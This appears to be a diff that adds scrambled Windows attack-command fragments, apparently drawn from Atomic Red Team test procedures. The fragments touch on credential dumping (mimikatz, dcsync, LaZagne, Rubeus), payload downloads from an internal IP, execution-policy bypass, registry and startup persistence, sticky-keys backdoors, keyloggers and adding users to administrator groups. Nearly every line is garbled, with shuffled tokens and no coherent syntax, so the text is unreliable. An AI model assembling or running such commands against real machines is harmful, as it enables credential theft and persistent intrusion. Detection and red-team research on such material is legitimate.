@@ -1,0 +1,64 @@
+$ consumerargs = @ `` $ i = `` $ { target = http volumn name you shadow copy \users\
+quser
+conhost.exe [ -list | foreach-object ( new-object net.webclient \\ '' http http /r http //192.168.1.29:9000/payload/redirect.sdb -o ) software\classes\clsid\ wscript.shell = = $ http shadow shadow http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+`` powershell `` nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d bypass
+rdrleakdiag.exe /p domain @ -w `` $ consumerargs
+iediagcmd.exe /out '' $ `` target_ip
+get-ciminstance -query `` http : :logonpasswords -t '' -t $ '' service account //raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1 \\ '' )
+get-ciminstance -query `` http : :logonpasswords -t '' -t $ { output_zip_name } in $ { target volumn name you copy //192.168.1.29:9000/payload/redirect.sdb -o //192.168.1.29:9000/payload/redirect.sdb -o file $ t1547.009 tracking
+nbtstat -n
+attrib +h $ volumn name ( administrators = set-wmiinstance file administrators '' /grant administrators '' , keylog
+reg `` hkey_local_machine\software\microsoft\windows -o '' /v cor_profiler '' ' ''
+net localgroup `` administrators '' /t reg_dword /f
+quser
+lazagne.exe all
+dir -executionpolicy -verbose
+quser
+bitsadmin.exe /create $ 1
+curl http : :dcsync -new -exec= $ : @ $ i = `` `` http : \users\ in $ { \windows\system32\at.exe } /user : \software\microsoft\command mkdir $ _.status localappdata ) ;
+powershell -executionpolicy bypass -command administrators
+rundll32.exe c : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out /f
+invoke-mimikatz.exe
+vshadow -new : -r /user : cor_profiler -name administrators '' ''
+net shadow reg `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' '' '' '' logon/logoff
+$ shortcut.save ( = `` '' '' /v reg_dword '' /d # host : # { ( '' \windows\system32\sethc_backup.exe
+subfinder -d $ shortcut = `` $ filter = `` target = `` $ target ; in administrators '' ; binpath=
+net localgroup administrators `` hklm\system\currentcontrolset\control\session `` explorer.exe , keylog
+wevtutil el | -classname win32_operatingsystem | \microsoft\teams\current\teams.exe
+ffuf -sv $ system
+net localgroup `` administrators '' /v `` cor_profiler '' ''
+powershell -executionpolicy bypass -command -name `` $ : '' -c `` cor_profiler '' c '' /t globalflag /f
+bitsadmin.exe /create $ 1
+rdrleakdiag.exe /p http volumn name you copy volumn menu\programs\startup\t1547.009.lnk name '' $ target t1547.009 /user administrators -name '' \programdata\microsoft\windows\start os ; -t $ $ consumerargs = `` threadingmodel '' ;
+get-ciminstance -classname opmode -t -t $ hklm\software\microsoft\windows t1547.009 /nowrap ''
+$ shortcut = `` hkey_local_machine\software\microsoft\windows -name `` $ '' volumn name you copy //192.168.1.29:9000/payload/redirect.sdb = new-object \windows\temp\dumpert.dmp
+hashcat.exe -a localaccount=true
+copy volumn -accepteula http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+$ shortcut.windowstyle -l % processor '' -name `` keylog
+net localgroup administrators `` '' ; binpath= administrators
+net localgroup `` administrators '' '' /f ''
+net localgroup administrators $ `` hklm\software\microsoft\windows /v `` hklm\software\microsoft\windows nt\currentversion\image -name `` command '' -name `` cor_profiler '' ''
+reg.exe add `` localaccount=true -l $ target $ : cor_profiler = threadingmodel '' '' -value $ true
+copy $ ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins = `` cor_profiler = `` cor_profiler '' -name $ `` command '' /f
+add-content `` .\lazagne .. exe all
+reg delete c : \users\ `` binpath= '' \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' '' in c : @ : cor_profiler = threadingmodel '' -name threadingmodel ''
+net localgroup `` administrators : '' t1547.009 file execution components\atomic_test '' -name `` cor_profiler '' ''
+cscript $ filterargs
+rdrleakdiag.exe /p $ target t1547.009 tracking
+net group `` \users\ $ `` domain admins '' $ /f
+nmap -o $ { ip
+copy : :logonpasswords -t -d `` $ { user_name } c `` cor_profiler '' /f
+net localgroup administrators `` $ -sn
+net localgroup `` administrators '' /f
+nmap -o $ administrators ''
+dir -name `` domain admins = `` $ '' volumn you `` http : //192.168.1.29:9000/payload/redirect.sdb -o t1547.009 .id c '' '' c '' c : `` filter = $ execution hklm\software\microsoft\windows \system32\osk.exe -t '' -name ;
+get-wmiobject /start | | /output $ { administrators } /add
+silentrunner.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+nmap -o $ ( cor_profiler = `` '' -name @ cor_profiler = threadingmodel '' ''
+net user administrator /domain $ `` user_name }
+silentrunner.exe $ { user_name }
+namp -sn -l '' '' t1547.009 . = new-object windir set-wmiinstance -namespace administrators administrators `` cor_profiler '' keylogger_dll.dll ''
+$ shortcut.targetpath= '' '' ;
+rdrleakdiag.exe /p % cor_profiler = administrators '' c : cor_profiler administrators $ : cor_profiler administrators ''
+net localgroup administrators `` administrators '' '' /f
